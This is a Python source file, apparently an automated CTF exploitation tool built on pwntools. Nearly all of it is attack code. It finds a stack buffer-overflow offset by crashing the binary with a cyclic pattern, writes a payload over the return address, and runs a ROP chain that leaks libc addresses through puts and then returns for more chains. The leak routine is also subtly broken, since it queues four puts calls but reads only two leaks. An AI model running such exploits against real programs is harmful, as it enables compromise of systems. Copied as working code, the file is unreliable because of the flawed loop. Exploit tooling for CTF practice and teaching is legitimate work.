#!/usr/bin/env python3
# autorop - automated solver of classic CTF pwn challenges, with flexibility in mind

from pwn import *

# make mypy happy by explicitly importing what we use
from pwn import tube, ELF, ROP, context, cyclic, cyclic_find, pack, log, process, unpack
from dataclasses import dataclass
from typing import Callable, Dict, List, Optional
from functools import reduce

CLEAN_TIME = 1  # pwntools tube.clean(CLEAN_TIME), for removed excess output


class PwnState:
    """Class for keeping track of our exploit development."""

    def __init__(self, binary_name: str, target: tube, vuln_function: str = "main"):
        self.binary_name = binary_name  # path to binary
        self.target = target  # tube pointing to the victim to exploit
        self.vuln_function = vuln_function  # name of vulnerable function in binary,
        # to return to repeatedly
        self.elf: ELF = ELF(self.binary_name)  # pwntools ELF of binary_name
        self.libc: Optional[ELF] = None  # ELF of target's libc
        # offset to return address via buffer overflow
        self.bof_ret_offset: Optional[int] = None
        # function which write rop chain to the "right place" (usually return address)
        self.overwriter: Optional[Callable[[tube, bytes], None]] = None
        self.leaks: Dict[str, int] = {}  # leaked symbols

        # set pwntools' context appropriately
        context.binary = self.binary_name  # set architecture etc. automagically
        context.cyclic_size = context.bits / 8


def util_addressify(data: bytes) -> int:
    """Produce the address from a data leak."""
    result: int = unpack(data[: context.bits // 8].ljust(context.bits // 8, b"\x00"))
    return result


def bof_corefile(state: PwnState) -> PwnState:
    """Find the offset to the return address via buffer overflow.

    This function not only finds the offset from the input to the return address
    on the stack, but also sets `overwriter` to be a function that correctly
    overwrites starting at the return address"""
    CYCLIC_SIZE = 1024
    if state.bof_ret_offset is None:
        # cause crash and find offset via corefile
        p: tube = process(state.binary_name)
        p.sendline(cyclic(CYCLIC_SIZE))
        p.wait()
        fault: int = p.corefile.fault_addr
        log.info("Fault address @ " + hex(fault))
        state.bof_ret_offset = cyclic_find(pack(fault))
    log.info("Offset to return address is " + str(state.bof_ret_offset))

    # define overwriter as expected - to write data starting at return address
    def overwriter(t: tube, data: bytes) -> None:
        t.sendline(cyclic(state.bof_ret_offset) + data)

    state.overwriter = overwriter
    return state


def leak_puts(state: PwnState) -> PwnState:
    """Leak libc addresses using `puts`.

    This function leaks the libc addresses of `__libc_start_main` and `puts`
    using `puts`, placing them in `state.leaks`.
    It expects the `state.overwriter` is set."""
    LEAK_FUNCS = ["__libc_start_main", "puts"]
    rop = ROP(state.elf)
    for func in LEAK_FUNCS:
        rop.puts(state.elf.got["__libc_start_main"])
        rop.puts(state.elf.got["puts"])
    rop.call(state.vuln_function)  # return back so we can execute more chains later
    log.info(rop.dump())

    state.target.clean(CLEAN_TIME)
    assert state.overwriter is not None
    state.overwriter(state.target, rop.chain())

    for func in LEAK_FUNCS:
        line = state.target.readline()
        log.debug(line)
        # remove last character which must be newline
        state.leaks[func] = util_addressify(line[:-1])
        log.info(f"leaked {func} @ " + hex(state.leaks[func]))

    return state


def pipeline(state: PwnState, *funcs: Callable[[PwnState], PwnState]) -> PwnState:
    """Pass the PwnState through a "pipeline", sequentially executing each given function."""

    with log.progress("Pipeline") as progress:

        def reducer(state: PwnState, func: Callable[[PwnState], PwnState]) -> PwnState:
            log.debug(state)
            progress.status(func.__name__)
            return func(state)

        return reduce(reducer, funcs, state)
